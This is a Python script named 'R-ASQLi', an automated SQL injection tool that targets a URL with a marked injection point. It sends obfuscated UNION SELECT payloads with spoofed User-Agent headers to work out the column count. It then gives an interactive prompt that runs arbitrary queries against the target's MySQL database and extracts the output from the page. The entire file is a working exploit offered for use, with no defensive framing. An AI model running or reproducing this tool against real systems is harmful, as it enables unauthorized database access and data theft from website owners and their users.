#!/usr/bin/python3.8

print("""
#####################################################
# R-ASQLi - Auto SQL Injection | Next From A5Inject #
# Copyright (c)2021 - Afrizal F.A - R&D ICWR        #
#####################################################
""")

import re, sys, random, requests
from argparse import ( ArgumentParser )

class r_asqli:

    def useragent(self):

        arr = [

            "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.0.12) Gecko/2009070611 Firefox/3.0.12 (.NET CLR 3.5.30729)",
            "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.464.0 Safari/534.3",
            "Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_5_8; ja-jp) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16",
            "Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0",
            "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.1 (KHTML, like Gecko) Chrome/6.0.427.0 Safari/534.1"
        
        ]

        return arr[random.randint(0, len(arr)-1)]

    def req_get(self, url):

        try:

            r = requests.Session()

            header = {

                "User-Agent": self.useragent()

            }

            resp = r.get(url = url, headers = header, timeout = self.opt['timeout']).text

        except:

            resp = False

        return resp

    def execute(self):

        print("[*] Start Inject URL : {}\n".format(self.opt["url"].replace("[*]", "")))

        x = "1111111111"

        for i in range(0, self.opt["count"]):
            
            query_union = "/*!12345UniOn*/SeleCt/**/{}-- '".format(x)
            print("[*] Trying Payload : {}".format(self.opt['url'].replace("[*]", query_union)))
            get_union = self.req_get(self.opt['url'].replace("[*]", query_union))

            if get_union != False:

                if re.search("1111111111", get_union) :

                    result_url = self.opt['url'].replace("[*]", query_union)
                    print("[+] This Site Is Vulnerability")

                    while True:

                        query = input("[*] mysql@target => ")

                        if query == "exit" :

                            exit()

                        remote_url = result_url.replace("1111111111", "(concat(0x3c63727573743e,{},0x3c2f63727573743e ))".format(query))
                        remote = self.req_get(remote_url)

                        if remote != False:

                            result = re.findall("""<crust>(.+?)</crust>""", remote)

                            if result :

                                print("[+] Output : {}".format(result[0]))

                            else :

                                print("[-] Query Not Executed")

                        else:

                            print("[-] Error")

                x += ",1111111111"

            else:

                print("\t[-] Payload Error : {}".format(self.opt['url'].replace("[*]", query_union)))


    def __init__(self):

        parser = ArgumentParser()
        parser.add_argument("-u", "--url", help = "URL Target with \"[*]\" for point of Inject", type = str, required = True)
        parser.add_argument("-c", "--count", help = "Count Column", type = int, required = True)
        parser.add_argument("-t", "--timeout", help = "Time Out", type = int, required = True)
        self.args = parser.parse_args()

        self.opt = {

            "url": self.args.url,
            "count": self.args.count,
            "timeout": self.args.timeout

        }

        if "[*]" in self.opt['url']:

            self.execute()

        else:

            print("[-] Please you must add \"[*]\" for inject point!")

if __name__ == "__main__":

    r_asqli()
